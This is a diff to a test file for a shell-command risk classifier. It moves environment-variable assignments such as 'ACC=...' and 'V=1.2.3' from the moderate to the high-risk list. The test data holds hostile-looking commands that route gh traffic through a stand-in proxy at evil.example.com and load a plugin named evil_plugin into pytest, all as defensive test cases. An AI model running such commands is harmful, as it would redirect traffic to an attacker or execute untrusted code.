@@ -488,6 +488,12 @@ describe('#1004 an assignment that redirects execution grades high', () => {
     'HTTPS_PROXY=evil.example.com:8080 gh pr view 1',
     'ALL_PROXY=evil.example.com:1080 gh issue list',
     'D=/tmp/e git status',
+    // No assignment is trusted any more, opaque-looking or not: the danger is
+    // in what the tool does with the variable. `PYTEST_PLUGINS=evil_plugin`
+    // and `ACC=da8d7a2a868` are the same shape.
+    'ACC=da8d7a2a868 git status',
+    'V=1.2.3 bun test',
+    'PYTEST_PLUGINS=evil_plugin pytest',
   ];
   for (const command of high) {
     test(JSON.stringify(command), () => expect(classifyRisk('Bash', { command })).toBe('high'));
@@ -497,8 +503,6 @@ describe('#1004 an assignment that redirects execution grades high', () => {
   // everything and stops meaning anything.
   const moderate = [
     'git commit -m x',
-    'ACC=da8d7a2a868 git status',
-    'V=1.2.3 bun test',
     'git commit -m FOO=bar',
     'grep -n A=B file.txt',
     'git log --format=%H',
